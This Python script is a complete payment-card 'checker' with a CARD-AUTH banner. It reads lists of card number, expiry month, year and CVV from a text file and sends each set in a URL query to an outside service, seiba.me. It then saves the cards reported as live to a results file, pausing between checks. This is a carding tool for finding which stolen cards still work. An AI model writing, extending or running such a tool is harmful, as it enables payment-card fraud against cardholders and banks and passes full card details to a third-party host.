import os
import requests
import time

def header():
    print('''

 ██████╗ █████╗ ██████╗ ██████╗        █████╗ ██╗   ██╗████████╗██╗  ██╗
██╔════╝██╔══██╗██╔══██╗██╔══██╗      ██╔══██╗██║   ██║╚══██╔══╝██║  ██║
██║     ███████║██████╔╝██║  ██║█████╗███████║██║   ██║   ██║   ███████║
██║     ██╔══██║██╔══██╗██║  ██║╚════╝██╔══██║██║   ██║   ██║   ██╔══██║
╚██████╗██║  ██║██║  ██║██████╔╝      ██║  ██║╚██████╔╝   ██║   ██║  ██║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝

        By : Seiba - https://seiba.me                                    
''')

def content_file():
    path = os.getcwd()
    file_path = path + '/data/raw/card.txt'
    file = open(file_path, 'r')
    content = file.read()
    content = content.split('\n')
    file.close()

    return content


def card_auth(ccn, month, year, cvv):

    url = 'https://seiba.me/card?ccn=' + ccn + '&month=' + month + '&year=' + year + '&cvv=' + cvv
    r = requests.get(url)

    result = r.json()
    if result['status'] == 200:
        
        if result['message']['status'] != 'declined':
            file_path = os.getcwd() + '/data/result/live.txt'
            file = open(file_path, 'a')
            file.write(ccn + '|' + month + '|' + year + '|' + cvv + ' => ' + result['message']['msg'] + '\n')
            file.close()

            return '[LIVE] ' + ccn + '|' + month + '|' + year + '|' + cvv + ' => ' + result['message']['msg']

        else:
            return '[DEAD] ' + ccn + '|' + month + '|' + year + '|' + cvv + ' => ' + result['message']['msg']
    
    else:

        return '[UNKN] ' + ccn + '|' + month + '|' + year + '|' + cvv + ' => ' + result['message']['msg']

if __name__ == '__main__':

    header()
    
    content = content_file()
    for line in content:
        if line != '':
            line = line.split('|')
            ccn = line[0]
            month = line[1]
            year = line[2]
            cvv = line[3]

            print(card_auth(ccn, month, year, cvv))
            time.sleep(2)